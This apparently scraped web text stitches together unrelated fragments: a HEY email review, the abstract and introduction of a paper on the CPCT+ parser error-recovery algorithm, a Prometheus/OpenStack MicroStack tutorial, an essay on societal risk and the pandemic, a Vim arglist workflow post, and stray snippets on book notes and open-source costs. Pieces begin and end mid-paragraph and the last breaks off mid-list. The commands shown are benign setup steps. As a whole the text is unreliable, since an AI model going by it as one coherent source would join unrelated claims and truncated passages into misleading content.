</figure></action-text-attachment><p>Clips is a brilliant feature that I never knew I needed. Highlight some text and save it in your list of clips. I can see this feature being expanded in the future, such as filtering and being able to set expiry dates.</p></div><p><strong>Custom Domains</strong></p><div><p>Perhaps the most common complaint I've seen on Twitter is the lack of custom domain support. I run email off my own domain so this is of course something of a blocker to my own full-time adoption. I did try forwarding my email into HEY for a while so I could use the app in anger, but I'm not yet ready to make my @hey.com address my default so I've paused this for now. <a href="https://hey.com/custom-domains/">Custom domains are coming</a> in 2020 and I'm excited to see what they offer from day one. I hope they nail it.</p></div><p><strong>🔕 Notifications&nbsp;</strong></p><div><p>Despite being something of an <a href="https://www.youtube.com/watch?v=z9UjeTMb3Yk">inbox zero</a> fiend, I have no problem with the <strong>Previously Seen</strong> list in my Imbox. I really like the idea of <strong>Paper Trail</strong> and <strong>The Feed</strong>, and autofiling email in there is great but I have a real gripe with notifications. I definitely <em>don't</em> want to be notified via push on my phone when a new item hits either of these areas, but when I log into HEY I definitely <em>do</em> want to be notified, visually, that there's something new to view in these areas. As it stands, I have to compulsively check each one irrespective of whether there's something new. HEY's philosophy is that I should ignore them entirely until I feel like reading my Feed, but in reality this is never going to work for me. I'd like to have HEY alert me to the fact that there's something there, and if I feel like reading the feed at that time I will, otherwise I'll come back later. If I don't know, I feel compelled to check which is just a waste of time.</p><p>Now forgive me for my sins, but I actually want to receive notifications for emails that hit my Imbox by default, not the other way round. With HEY there is no way to do this – no notifications at all. You have to manually edit each contact and enable notifications for them specifically. I'd much rather HEY let me choose which is <em>my</em> preferred default, irrespective of the philosophy. Let me default to on.</p><p><strong>Imbox</strong></p></div><p>Please just call it Inbox! I can never unsee a typo here, I'm sorry. I understand but it just doesn't work for me.</p><div>
<p><strong>Quoted text rendering</strong><br>This is a total design challenge and HEY is no worse than Gmail in this regard, but I have to say Fastmail do a far better job of it. HEY rendering feels like a backwards step after using Fastmail and its multi-coloured threading. Hopefully it will improve over time.</p><action-text-attachment sgid="BAh7CEkiCGdpZAY6BkVUSSI1Z2lkOi8vYmxvZ2xpbmUvQWN0aXZlU3RvcmFnZTo6QmxvYi82Nz9leHBpcmVzX2luBjsAVEkiDHB1cnBvc2UGOwBUSSIPYXR0YWNoYWJsZQY7AFRJIg9leHBpcmVzX2F0BjsAVDA=--91de462762132f39e441634c12f167e819f1c6ca" content-type="image/jpeg" url="https://blogline.co/rails/active_storage/blobs/redirect/eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaHBTQT09IiwiZXhwIjpudWxsLCJwdXIiOiJibG9iX2lkIn19--f569091fa601e5688d3533388044e529e598f984/IMG_0171.JPG" filename="IMG_0171.JPG" filesize="38317" width="780" height="520" previewable="true" presentation="gallery" caption="Fastmail's tasty quote rendering"><figure>

</figure></action-text-attachment><p><strong>Exporting</strong><br>The export to MBOX feature is great – it's my data and it means I'm not locked in. I know that if I decide to leave HEY, I can easily export all my mail and push it back into Fastmail. However, I like to label a bunch of my emails and currently this metadata will be lost when exporting from HEY. I suggested to DHH that they use IMAP folders in the export to maintain label information and <a href="https://twitter.com/lylo/status/1275426572053471233?s=20">he said it was a good idea</a>, so perhaps it will see the light of day soon 🤞</p></div><p><strong>😴 Snooze</strong></p><p>Set Aside is great, I like it a lot. But sometimes there are emails that I want to set aside for a longer period and the Snooze feature in Gmail and Fastmail is super-handy for this. When you set something aside in HEY, the email is there in the stack, staring at you in the face every time you visit. This isn't desirable for 'set aside for ages' emails, so a Snooze function (either as part of Set Aside, or just in general) would be great.&nbsp;</p><div><p>Undoubtedly the killer feature of HEY is the built-in workflow. Some people have suggested that this is a feature that could be replicated in standard email, so I had a crack at this with my Fastmail account. While not being a match for HEY, it actually worked surprisingly well!</p><p>I first created labels for <strong>Reply Later</strong>, <strong>Set Aside</strong>, <strong>The Feed</strong> and <strong>Paper Trail:</strong></p></div><div>

</figure></action-text-attachment><p>Moving mail into Reply Later or Set Aside is really easy in Fastmail because of their keyboard shortcuts: view the mail, click 'm' to bring up the 'Move' menu and then start typing 'Repl..' to label it as Reply Later. Admittedly not as slick as HEY but it's blazingly fast (as are most things in Fastmail) when you're used to it. </p><p>I then set up rules to move things into The Feed and Paper Trail. Again, not as simple as with HEY but the rules in Fastmail are very powerful so you do have a bit more flexibility here:</p><action-text-attachment sgid="BAh7CEkiCGdpZAY6BkVUSSI1Z2lkOi8vYmxvZ2xpbmUvQWN0aXZlU3RvcmFnZTo6QmxvYi82ND9leHBpcmVzX2luBjsAVEkiDHB1cnBvc2UGOwBUSSIPYXR0YWNoYWJsZQY7AFRJIg9leHBpcmVzX2F0BjsAVDA=--0497b10d4c7160b0d8f48c584f1fa4aace19103f" content-type="image/png" url="https://blogline.co/rails/active_storage/blobs/redirect/eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaHBSUT09IiwiZXhwIjpudWxsLCJwdXIiOiJibG9iX2lkIn19--5a85ebb4b8d252c1a8cd1e5242edeed0eb627d8c/image.png" filename="image.png" filesize="18662" width="465" height="117" previewable="true" presentation="gallery" caption="Using Fastmail's powerful rules to replicate The Feed"><figure>

</figure></action-text-attachment></div><p><strong>The Screener</strong></p><div><p>I might be in the minority but I find The Screener more annoying than not. It turns out it's extremely rare that I receive an email from someone that I want to screen out. I can do this in Fastmail using blocking, but my blocklist is virtually empty. </p><p>If I was using HEY for my work email, however, it would be a <strong>completely different story </strong>which does make me wonder whether HEY's future success really lies in the business market.</p></div><div><p>Using HEY is a really nice and unique email experience, but it's early days and 'power users' like me will likely find it lacking in some areas. </p><p>I've already paid for my first year because I love the @hey.com email address, I really want to try HEY with custom domains when they launch, and I also want to see how it develops in the coming year. I'm also happy to pay Basecamp to keep developing this product as it feels important right now. <strong>The world needs more players in the email provider space, especially high-quality, privacy-focused products</strong>. Until HEY arrived, Fastmail was the only <em>major</em> player other than the obvious 'free' options of Gmail, Microsoft and Yahoo.</p><p>Can HEY fully replace Fastmail for me though? Will I be renewing in 12 month's time?</p><p>Once custom domains land, I think it <em>could</em> replace Fastmail for me. That said, I'll likely still end up paying for Fastmail irrespective of how HEY develops simply because of their excellent multi-domain support. So I'll probably end up paying for both! 😅</p><p>With Fastmail I can create forwarders on my family domain for the kids (I really hope HEY's custom domain feature will support this, but I'm not confident they will). I can also support fully-featured email on all the domains I own (such as the one for this blog!) without incurring any additional cost or hassle dealing with other email providers.

<p><strong>Abstract</strong>  
<span>Syntax errors are generally easy to fix for humans, but not for parsers in general nor LR parsers in</span>
<span>particular. Traditional ‘panic mode’ error recovery, though easy to implement and applicable to</span>
<span>any grammar, often leads to a cascading chain of errors that drown out the original. More</span>
<span>advanced error recovery techniques suffer less from this problem but have seen little practical use</span>
<span>because their typical performance was seen as poor, their worst case unbounded, and the</span>
<span>repairs they reported arbitrary. In this paper we introduce the </span><span>CPCT</span><span>+</span>  <span>algorithm, and an</span>
<span>implementation of that algorithm, that address these issues. First, </span><span>CPCT</span><span>+</span> <span>reports the complete set of</span>
<span>minimum cost repair sequences for a given location, allowing programmers to select the one that</span>
<span>best fits their intention. Second, on a corpus of 200,000 real-world syntactically invalid Java</span>
<span>programs, </span><span>CPCT</span><span>+</span>  <span>is able to repair 98.37%</span><span>±</span><span>0.017% </span><span>of files within a timeout of 0.5s. Finally,</span>
<span>CPCT</span><span>+</span> <span>uses the complete set of minimum cost repair sequences to reduce the cascading error</span>
<span>problem, where incorrect error recovery causes further spurious syntax errors to be identified.</span>
<span>Across the test corpus, </span><span>CPCT</span><span>+</span> <span>reports 435,812</span><span>±</span><span>473 </span><span>error locations to the user, reducing the</span>
<span>cascading error problem substantially relative to the 981,628</span><span>±</span><span>0 </span><span>error locations reported by panic</span>
<span>mode.</span>

<h3><span>1</span> <a id="x1-10001"></a>Introduction</h3>
<!--l. 131--><p>Programming is a humbling job which requires acknowledging that we will make untold errors in
our quest to perfect a program. Most troubling are semantic errors, where we intended the
program to do one thing, but it does another. Less troubling, but often no less irritating, are
syntax errors, which are generally minor deviances from the exacting syntax required by a
compiler. So common are syntax errors that parsers in modern compilers are designed to cope
with us making several: rather than stop on the first syntax error, they attempt to
<span>recover </span>from it. This allows them to report, and us to fix, all our syntax errors in one
go.
</p><!--l. 141--><p>When error recovery works well, it is a useful productivity gain. Unfortunately, most current
error recovery approaches are simplistic. The most common grammar-neutral approach to error
recovery are those algorithms described as ‘panic mode’ (e.g.&nbsp;[<a href="#Xholub90compilerdesign">13</a>, p.&nbsp;348]) which skip input until
the parser finds something it is able to parse. A more grammar-specific variation of this
idea is to skip input until a pre-determined synchronisation token (e.g. ‘;’ in Java) is
reached&nbsp;[<a href="#Xdegano95comparison">8</a> , p.&nbsp;3], or to try inserting a single synchronisation token. Such strategies are
often unsuccessful, leading to a cascade of spurious syntax errors (see Figure&nbsp;<a href="#x1-1018r1">1<!--tex4ht:ref: fig:javaerror --></a> for an
example). Programmers quickly learn that only the location of the first error in a file – not
the reported repair, nor the location of subsequent errors – can be relied upon to be
accurate.

<!--l. 233--><p>It is possible to hand-craft error recovery algorithms for a specific language. These
generally allow better recovery from errors, but are challenging to create. For example,
the Java error recovery approach in the Eclipse IDE is 5KLoC long, making it only
slightly smaller than a modern version of Berkeley Yacc — a complete parsing system!
Unsurprisingly, few real-world parsers contain effective hand-written error recovery
algorithms.
</p><!--l. 240--><p>Most of us are so used to these trade-offs (cheap generic algorithms and poor recovery
vs.&nbsp;expensive hand-written algorithms and reasonable recovery) that we assume them to be
inevitable. However, there is a long line of work on more advanced generic error recovery
algorithms. Probably the earliest such algorithm is Aho and Peterson&nbsp;[<a href="#Xaho72minimum">1</a>], which, upon
encountering an error, creates on-the-fly an alternative (possibly ambiguous) grammar which
allows the parser to recover. This algorithm has fallen out of favour in programming
language circles, probably because of its implementation complexity and the difficulty of
explaining to users what recovery has been used. A simpler family of algorithms, which
trace their roots to Fischer <span>et al.</span>&nbsp;[<a href="#Xfischer79locally">11</a>], instead try to find a single minimum cost <span>repair</span>
<span>sequence </span>of token insertions and deletions which allow the parser to recover. Algorithms in
this family are much better at recovering from errors than naive approaches and can
communicate the repairs they find in a way that humans can easily replicate. However, such
algorithms have seen little practical use because their typical performance is seen as
poor and their worst case unbounded [<a href="#Xmckenzie95error">17</a>, p.&nbsp;14]. We add a further complaint: such
approaches only report a single repair sequence to users. In general – and especially in
syntactically rich languages – there are multiple reasonable repair sequences for a given
error location, and the algorithm has no way of knowing which best matches the user’s
intentions.
</p><!--l. 261--><p>In this paper we introduce a new error recovery algorithm in the Fischer <span>et al. </span>family, <span>CPCT</span><span>+</span>.
This takes the approach of Corchuelo <span>et al.</span>&nbsp;[<a href="#Xcorchuelo02repairing">5</a>] as a base, corrects it, expands it, and
optimises its implementation. <span>CPCT</span><span>+</span> is simple to implement (under 500 lines of Rust
code), is able to repair nearly all errors in reasonable time, reports the complete set of
minimum cost repair sequences to users, and does so in less time than Corchuelo <span>et</span>
<span>al.</span>.
</p><!--l. 269--><p>We validate <span>CPCT</span><span>+</span> on a corpus of 200,000 real, syntactically incorrect, Java programs
(Section&nbsp;<a href="#x1-140006">6<!--tex4ht:ref: experiment --></a>). <span>CPCT</span><span>+</span> is able to recover 98.37%<span>±</span><span>0.017% </span>of files within a 0.5s timeout and does so
while reporting fewer than half the error locations as a traditional panic mode algorithm: in other
words, <span>CPCT</span><span>+</span> substantially reduces the cascading error problem. We also show – for, as far as we
know, the first time – that advanced error recovery can be naturally added to a Yacc-esque
system, allowing users to make fine-grained decisions about what to do when error recovery has
been applied to an input (Section&nbsp;<a href="#x1-180007">7<!--tex4ht:ref: sec:api --></a>). We believe that this shows that algorithms such as <span>CPCT</span><span>+</span>
are ready for wider usage, either on their own, or as part of a multi-phase recovery
system.
</p>
<h4><span>1.1</span> <a id="x1-20001.1"></a>Defining the problem</h4>
<!--l. 285--><p>Formally speaking, we first test the following hypothesis:
</p><!--l. 287--><dl><dt>
<span>H1</span></dt><dd>The complete set of minimum cost repair sequences can be found in acceptable time.</dd></dl>
                                                                            
                                                                            
<!--l. 292--><p>The only work we are aware of with a similar concept of ‘acceptable time’ is&nbsp;[<a href="#XdeJonge12natural">6</a>], who define it
as the total time spent in error recovery per file, with a threshold of 1s. We use that
definition with one change: Since many compilers are able to fully execute in less than 1s,
we felt that a tighter threshold is more appropriate: we use 0.5s since we think that
even the most demanding users will tolerate such a delay. We strongly validate this
hypothesis.
</p><!--l. 300--><p>The complete set of minimum cost repair sequences makes it more likely that the programmer
will see a repair sequence that matches their original intention (see Figure&nbsp;<a href="#x1-1018r1">1<!--tex4ht:ref: fig:javaerror --></a> for an example;
Appendix&nbsp;<a href="#x1-28000A">A<!--tex4ht:ref: app:examples --></a> contains further examples in Java, Lua, and PHP). It also opens up a new
opportunity. Previous error recovery algorithms find a single repair sequence, apply that to the
input, and then continue parsing. While that repair sequence may have been a reasonable local
choice, it may cause cascading errors later. Since we have the complete set of minimum
cost repair sequences available, we can select from that set a repair sequence which
causes fewer cascading errors. We thus rank repair sequences by how far they allow
parsing to continue successfully (up to a threshold — parsing the whole file would, in
general, be too costly), and choose from the subset that gets furthest (note that the
time required to do this is included in the 0.5s timeout). We thus also test a second
hypothesis:
</p><!--l. 315--><dl><dt>
<span>H2</span></dt><dd>Ranking the complete set of minimum cost repair sequences by how far they allow
parsing to continue locally reduces the global cascading error problem.</dd></dl>
<!--l. 321--><p>We also strongly validate this hypothesis. We do this by comparing ‘normal’ <span>CPCT</span><span>+</span> with a
simple variant <span>CPCT</span><span>+</span><span>rev</span> which reverses the ranking process, always selecting from amongst the
worst …</p></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
                <p>In a previous <a href="https://yetiops.net/posts/prometheus-service-discovery-aws-gcp-azure/">post</a> I mentioned that Prometheus has a number of ways to discover services. This ranges from statically defined configuration to consuming APIs from different cloud providers. So far, we have covered: -</p>
<ul>
<li><a href="https://yetiops.net/posts/prometheus-service-discovery-aws-gcp-azure/">AWS, Azure and Google Cloud Platform</a></li>
<li><a href="https://yetiops.net/posts/prometheus-service-discovery-digitalocean/">Digital Ocean</a></li>
</ul>
<p>In this post we will cover discovering services running on OpenStack.</p>
<h2 id="what-is-openstack">What is OpenStack?</h2>
<p>OpenStack is a way of running your own Infrastructure-as-a-service platform. It enables you to deploy compute, storage, networking and other resources similar to the major cloud providers. It began as a joint venture between <a href="https://www.rackspace.com/">Rackspace</a> and <a href="https://www.nasa.gov/">NASA</a> to provide an Open Source cloud solution.</p>
<p>Initially, OpenStack was embraced by a number of different sectors of the IT industry. Some companies saw it as a way to become an alternative to the likes of AWS or Azure (eg <a href="https://en.wikipedia.org/wiki/HPE_Helion">HPE Helion</a>, <a href="https://www.ovh.co.uk/">OVH</a>, <a href="https://carrier.huawei.com/en/products/IT/cloud-computing">Huawei</a>). For others, it enabled them to use their existing hardware while being able to spin up resources in a cloud-like way.</p>
<p>In recent years, OpenStack has become increasingly popular with telecommunications providers. Many of these providers own or have access to telecoms exchanges, and have large data centre footprints spanning cities, countries and even continents. OpenStack allows them to create multi-region clouds of their own, without the need to leverage a public cloud provider.</p>
<h2 id="the-lab">The lab</h2>
<p>OpenStack usually requires a fleet of high-powered servers managed as a cluster (or multiple clusters) of compute, storage and other services. If you want to test out OpenStack on a single machine, there are multiple options available: -</p>
<ul>
<li><a href="https://opendev.org/openstack/devstack">DevStack</a> - Installs OpenStack on a virtual machine (or physical machine) running Ubuntu or Fedora and turns it into a mini OpenStack cloud</li>
<li><a href="https://microstack.run/">MicroStack</a> - A Canonical projcect that deploys a OpenStack inside of a Snap package</li>
<li><a href="https://github.com/openstack/kolla-ansible">Kolla-Ansible</a> - An Ansible project that deploys all the OpenStack services as containers</li>
</ul>
<p>I decided to use MicroStack on an Ubuntu 18.04 LTS virtual machine.</p>
<h3 id="microstack">MicroStack</h3>
<p>To install and run MicroStack, run the following commands: -</p>
<div><pre><code data-lang="bash"><span># Install MicroStack with Classic confinement (i.e. not fully sandboxed)</span>
$ sudo snap install microstack --classic --beta

<span># Initialize MicroStack</span>
$ sudo microstack.init --auto
</code></pre></div><p>After a few minutes (ranging from 5 to 20 minutes, depending on your machine) MicroStack will have finished initializing. The web interface will be available at <code>http://10.20.20.1</code>: -</p>
<p><img src="https://yetiops.net/img/prometheus/microstack-login.png" alt="MicroStack Login Page"></p>
<p>The credentials for this page are: -</p>
<ul>
<li>Username: <code>admin</code></li>
<li>Password: <code>keystone</code></li>
</ul>
<p><img src="https://yetiops.net/img/prometheus/microstack-dashboard.png" alt="MicroStack Dashboard"></p>
<p>You can create a virtual machine (<strong>instance</strong>) from here, or from the command line.</p>
<div><pre><code data-lang="bash"><span># Launch the instance</span>
$ microstack.launch cirros --name test

Server test launched! <span>(</span>status is BUILD<span>)</span>

Access it with <span>`</span>ssh -i $HOME/.ssh/id_microstack<span>`</span> &lt;username&gt;@10.20.20.143

<span># SSH to it, with the MicroStack generated SSH key</span>
$ ssh -i ~/.ssh/id_microstack <a href="https://yetiops.net/cdn-cgi/l/email-protection" data-cfemail="e88b819a9a879ba8d9d8c6dad8c6dad8c6d9dcdb">[email&nbsp;protected]</a>

<span># Check that this machine is running the buildroot OS (which is what CirrOS uses)</span>
$ cat /etc/os-release
NAME<span>=</span>Buildroot
VERSION<span>=</span>2015.05-g31af4e3-dirty
ID<span>=</span>buildroot
VERSION_ID<span>=</span>2015.05
PRETTY_NAME<span>=</span><span>"Buildroot 2015.05"</span>
</code></pre></div><p>Notice that all the commands are prefixed with <code>microstack.</code>. This is because OpenStack runs inside a Snap package.</p>
<h3 id="adding-additional-images">Adding additional images</h3>
<p>By default, MicroStack only includes the CirrOS image. While it is useful for testing that OpenStack can provision resources, it does not provide the ability to install packages.</p>
<p>Many Linux distributions create OpenStack-ready images, a list of which can be found <a href="https://docs.openstack.org/image-guide/obtain-images.html">here</a>.</p>
<p>For this post, I used a Debian Buster image: -</p>
<div><pre><code data-lang="bash"><span># Download the image</span>
$ wget https://cdimage.debian.org/cdimage/openstack/current/debian-10.4.3-20200610-openstack-amd64.qcow2

<span># Add the image to OpenStack</span>
$ microstack.openstack image create <span>\
</span><span></span>            --container-format bare <span>\
</span><span></span>            --disk-format qcow2 <span>\
</span><span></span>            --file debian-10.4.3-20200610-openstack-amd64.qcow2 <span>\
</span><span></span>            debian-buster

<span># Verify that the image is defined</span>

<h2 id="terraform">Terraform</h2>
<p>Terraform has an official <a href="https://www.terraform.io/docs/providers/openstack/index.html">OpenStack Provider</a> that allows you to manage the resources on OpenStack. It can create everything from compute instances, object storage, containers and more.</p>

<h3 id="create-application-credentials">Create application credentials</h3>
<p>You can use OpenStack user credentials (even the <code>admin</code> account) with Terraform if you choose. However, using <strong>application credentials</strong> allows you to restrict what access Terraform has, and can be revoked and/or rotated if the credentials are exposed in some way.</p>
<p>To generate an application credential, you can either use the CLI or the web interface.</p>

                    <div>
                        <p>In a recent <a href="https://a16z.com/2020/04/18/its-time-to-build/">call to arms</a>, software magnate Marc Andreessen remarked on widespread inability to respond swiftly, let alone appropriately, to the onset of pandemic:</p><blockquote>[...] the harsh reality is that it all failed — no Western country, or state, or city was prepared — and despite hard work and often extraordinary sacrifice by many people within these institutions. So the problem runs deeper than your favorite political opponent or your home nation.</blockquote><p>I propose an explanation: Civilization-level threats, small or large, are dealt with by the "civilizational immune system" at hand. This emergent lattice of societal risk management finds its thousandfold cruxes in human perception(s) and understanding(s) of our environment. Plus what we do about them, which is crucial.</p><p>Much like the standard <em>Homo sapiens</em> model, our civilizational immune system is decentralized, composed of many individuals and clumps thereof that possess both the capability and means of action. Its memory stretches back a handful of generations, encompassing whatever the proximal practitioners (<a href="https://en.wikipedia.org/wiki/White_blood_cell">leukocyte</a> equivalents) have encountered in their own lives, along with the <a href="https://samzdat.com/2017/05/22/man-as-a-rationalist-animal/">gestalt <em>metis</em></a> that was <a href="https://medium.com/the-long-now-foundation/intellectual-dark-matter-2e5890aa8d8f">conveyed by their mentors</a>.</p><hr><p>During late February and early March of this year, it became clear that many people, intelligent people who would gladly acknowledge the danger and dynamics of infectious disease <em>in abstract</em>,<em> </em>were ill-equipped to accept that it could happen, <em>for real</em>, to them personally. A communally devastating plague that spreads to, then within, the First World? Gracious, what fanciful paranoia!</p><p>Even "experts" (writ large) did not conceive that, say, the United States Surgeon General would instruct Americans to become T-shirt ninjas in order to safely — in many places, <em>lawfully</em> — leave their homes. Yet evidently such an outcome was imminent, given that it happened! Ironically, even the overeducated will trust their gut's synthesis of personal experience and manufactured consent over, well, anything else.</p><p>Should the early popular reaction be a surprise? When prospects of pandemic were last bandied about in the public sphere, we regular folks were never asked to stay home from work. Nobody asked us to do anything in particular at all! The uproar simply petered out and everyone went on their merry way. (If you got swine flu, my condolences.)</p><p>All that anxiety for nothing, then you demand us to believe it's Real This Time™? <a href="https://www.reddit.com/r/TheMotte/comments/g4mse5/culture_war_roundup_for_the_week_of_april_20_2020/fojpti3/">Empirical evidence that I can observe directly</a> — such as local authorities ordering shutdown —&nbsp;or GTFO. (That said, YMMV.)</p><hr><p>By now it's cliché to point out that several Asian countries were decisively cautious, making good calls quickly, probably due to recent experience with a rapacious respiratory infection. Huh... thank you, SARS? When faced with exponential growth, time is cheaper the sooner you start buying it!</p><p>State capacity and willingness to use it were key, but so was the populace being aware that viruses like COVID-19 are 1) a thing, 2) bad enough to be worth averting or avoiding at high cost.</p><p>What if it is indeed that simple? What if:</p><blockquote>The more time has passed since a given type of tail risk last afflicted a given society, the more vulnerable the society will be to that tail risk. And the more materially devastated it'll be, relative to peers with situation-adapted civilizational immune systems, when that risk actually happens.</blockquote><p>This nth-order phenomenon is a tradeoff of <a href="https://en.wikipedia.org/wiki/Status_quo_bias">status quo bias</a> and <a href="https://en.wikipedia.org/wiki/Normalcy_bias">normalcy bias</a>, which I posit are rational:</p><figure><blockquote><p lang="en" dir="ltr">when any given tail risk hits, it's super expensive. but it would inefficient to heavily invest in protecting against *all* tail risks, which is what we'd have to do to protect against *any* of them. since we don't know in advance which one will hit in a given timeframe</p>— sonya... supposedly (@sonyasupposedly) <a href="https://twitter.com/sonyasupposedly/status/1244395054120067072?ref_src=twsrc%5Etfw">March 29, 2020</a></blockquote>

</figure><figure><blockquote><p lang="en" dir="ltr">so I suspect that the reason why we don't do this — e.g., why we don't stockpile lots of masks in countries that haven't been hit by a respiratory-spread epidemic lately — is because it's actually adaptive, on the macro scale, to do what later looks like underinvestment</p>— sonya... supposedly (@sonyasupposedly) <a href="https://twitter.com/sonyasupposedly/status/1244395587224494080?ref_src=twsrc%5Etfw">March 29, 2020</a></blockquote>

</figure><figure><blockquote><p lang="en" dir="ltr">In military history, you see this balancing act a lot. You need to keep a fleet in being or a cadre between wars, to maintain the ability to spin up when needed. But interwar materiel and doctrine is usually outdated when needed, so over-investing is not productive.</p>— Eric Richards (@EricRichards22) <a href="https://twitter.com/EricRichards22/status/1244397193294987270?ref_src=twsrc%5Etfw">March 29, 2020</a></blockquote>

</figure><p>The West hasn't dealt with a society-disrupting pandemic in a long while, so our civilizational immune system wasn't prepared for it. The data wasn't in the training set, if you will.</p><p>Granted, a lot of <a href="https://rootsofprogress.org/things-that-happened-in-1973">infrastructure that <em>is</em> in place</a> has been taken for granted, and its presence radically sped up response time. Imagine if we remained ignorant of germ theory, or didn't have analytic tools like R0 and CFR versus IFR!</p><hr><p>It is critical for our attitudes to be accurate. Not merely accurate with respect to the moment, but <em>predictive</em> of how we ought to act in subsequent moments. To be more precise: How we will end up concluding that we ought to have acted, once everything shakes out. This meta purpose is encoded in our millennia-evolved psychological constructs, optimized for survival and perpetuation — AKA, constituents of the entity we call the mind.</p><p>My theory is that humans evolved to dismiss the possibility of whatever they haven't experienced themselves, without any conscious regard to probability. I would argue that our brains <em>block</em> us from explicit evaluation of risk when doing so might otherwise provide a chance to talk ourselves out of an overall protective heuristic.</p><p>Should we change? Well, when it comes to optimizing the allocation of scarce resources, I'd bet on evolution in the long run. Let's see you beat that track record 😉</p><hr><p><a href="https://www.flickr.com/photos/niaid/8436193898/in/album-72157627714446209/">Header photo via NIAID</a>: "Scanning electron micrograph of methicillin-resistant <em>Staphylococcus aureus</em> and a dead human neutrophil."</p>

<![CDATA[Vim's Arglist as a File-Centric Todo List]]>

July 15, 2020 | https://ctoomey.com/writing/using-vims-arglist-as-a-todo-list/ | <a href="https://web.archive.org/web/*/https://ctoomey.com/writing/using-vims-arglist-as-a-todo-list/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
        
  <p>I often find myself wanting to make similar edits to a set of files within a
project. More than I can do with <code>sed</code>, but simple enough that <code>ag</code> + <code>vim</code> are
the perfect tools for the job. In the age-old tradition of using blog posts as
notes to one’s future self (and any other kind soul who happens to need the same
pile of hacks I stumbled upon), here we are.</p>

<p>Further below is an explanation of the different tools at play, but in short,
this is the workflow:</p>

<ol>
  <li>Open Vim with the desired files, e.g., <code>vim $(ag -l "from 'react'")</code></li>
  <li>Edit the current file as needed using all the flexibility of Vim (macros,
plugins, brute force edits all welcome here)</li>
  <li>When the edits for the current file are done, run the <code>:ThankYouNext</code> command
(see below for <a href="#working-through-the-list">the bit of Vimscript that makes that work</a>) to move on to
the next file.</li>
  <li>Repeat from step 2 until all files are edited and you’re left with an empty Vim
session.</li>
</ol>

<h2 id="populating-the-arglist">Populating the Arglist</h2>

<p>This workflow uses Vim’s <code>arglist</code> feature, which allows us to manage a subset
of the open buffers as a distinct group. In our case, we can use it as a
file-centric todo list.</p>

<p>Starting from the command line, we can use any and all of our favorite tools
like <code>find</code>, <code>grep</code>, <code>sed</code>, <code>awk</code>, <a href="https://github.com/ggreer/the_silver_searcher"><code>ag</code></a> (or <a href="https://github.com/BurntSushi/ripgrep"><code>ripgrep</code></a> or <a href="https://beyondgrep.com/"><code>ack</code></a> or
whichever you search with), <a href="https://github.com/sharkdp/fd"><code>fd</code></a>, <a href="https://github.com/junegunn/fzf"><code>fzf</code></a>, etc. Here’s a handful of examples:</p>

<div><pre><code><span># Files matching a search</span>
❯ vim <span>$(</span>ag <span>-l</span> <span>"from 'react-dom'"</span><span>)</span>

<span># Files w/ names matching a pattern</span>
❯ vim <span>$(</span>fd <span>'_spec.rb$'</span> spec/<span>)</span>

<span># Files selected from fuzzy finding w/ fzf</span>
❯ vim <span>$(</span>fzf <span>--multi</span><span>)</span>

<span># Files with uncommitted changes</span>
❯ vim <span>$(</span>git diff <span>--name-only</span><span>)</span>

<span># Files modified on this branch</span>
❯ vim <span>$(</span>git diff master <span>--name-only</span><span>)</span>

<span># Files w/ failing specs (using RSpec's persisted failure file)</span>
❯ vim <span>$(</span><span>grep</span> <span>'failed'</span> spec/examples.txt | awk <span>'{print $1}'</span> | sed <span>'s/\[.*$//'</span> | sort | uniq<span>)</span>

<span># Conflicted files in git</span>
❯ vim <span>$(</span>git ls-files <span>-u</span> | awk <span>'{print $4}'</span> | sort <span>-u</span><span>)</span>

<span># A list of files copied to our clipboard</span>
❯ vim <span>$(</span>pbpaste<span>)</span>
</code></pre></div>
<p>When we open Vim by providing an initial set of files, Vim will load them into
the arglist and open the first file for editing. You can check the current state
of the arglist at any time by running <code>:args</code>, with the output looking something
like the following:</p>

<div><pre><code>[dir/file_a.txt] dir/file_b.txt dir/nested/file_last.txt
</code></pre></div>
<p>Many thanks to Drew Neil for the amazing Vimcasts series, in particular <a href="http://vimcasts.org/episodes/populating-the-arglist/">this
video on the arglist</a> which got me started down this path.</p>

<p><em>Note</em>: While it’s possible to populate the arglist from within Vim, I found
that approach to have a number of edge cases and instead I’ve had the best luck
starting from the command line.</p>

<p><em>Other Note</em>: All of the above examples use <code>vim $(...)</code> style command
substitution as I think it looks a little more obvious, but thanks to <a href="https://twitter.com/relausen/status/1282762389964967936">a tip
from Rune Lausen</a> I’ve learned that you can use <code>... | xargs -o vim</code> (where
<code>...</code> is any of the above commands above like <code>git diff --name-only</code>). This is
likely what I’ll end up using in my day to day as it makes it easier to iterate
on the file-finding commands, and then just tack on the <code>| xargs -o vim</code> to pipe
the files to Vim.</p>

<h2 id="working-through-the-list">Working Through the List</h2>

<p>This is the novel part that I always find myself forgetting, which brings us to
this very blog post. Once we’re done with the edits for a given file, we want to
write the current file, remove it from the list and progress to the next one.</p>

<p>To wrap up the handful of Vimscript functions needed to do this, you can add the
following to your <code>~/.vimrc</code>:</p>

<div><pre><code><span>function</span><span>!</span> <span>s:ThankYouNext</span><span>()</span> abort
  <span>update</span>
  <span>argdelete</span> %
  <span>bdelete</span>
  <span>if</span> <span>!</span>empty<span>(</span>argv<span>())</span>
    <span>argument</span>
  <span>endif</span>
<span>endfunction</span>

command<span>!</span> ThankYouNext <span>call</span> <span>&lt;</span>sid<span>&gt;</span>ThankYouNext<span>()</span>
</code></pre></div>
<p>With this in place we can now use the new command, <code>:ThankYouNext</code>, and we’ll be
taken to the next file or an empty Vim session to let us know we’re done.</p>

If you then spent the 3-6 hours reading each book, and 1-2 hours taking notes on them, it’d take you anywhere from 800 – 1,600 hours to recreate this.</p><p>How much does lifetime access cost?&nbsp;<strong>$25 bucks</strong>.</p><p>Nat was kind enough to share some of the data on this little digital project.</p><figure><p><img src="https://embed.filekitcdn.com/e/soCyR57pgxv3XZJLXQFY1r/iiCk6FEUfbhEJbd8U4HZUW/email" width="800" data-old-src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></p></figure><p>You read that right.

<p><span data-preserver-spaces="true">It’s been a while since I’ve heard the idea that&nbsp;“</span><b>making {some software} open source won’t cost {company} anything,”</b> but I did today.</p>

<p><span data-preserver-spaces="true">Not being able to find an existing list of reasons why this isn’t the case, here are a few quick thoughts:</span></p>

<ul>
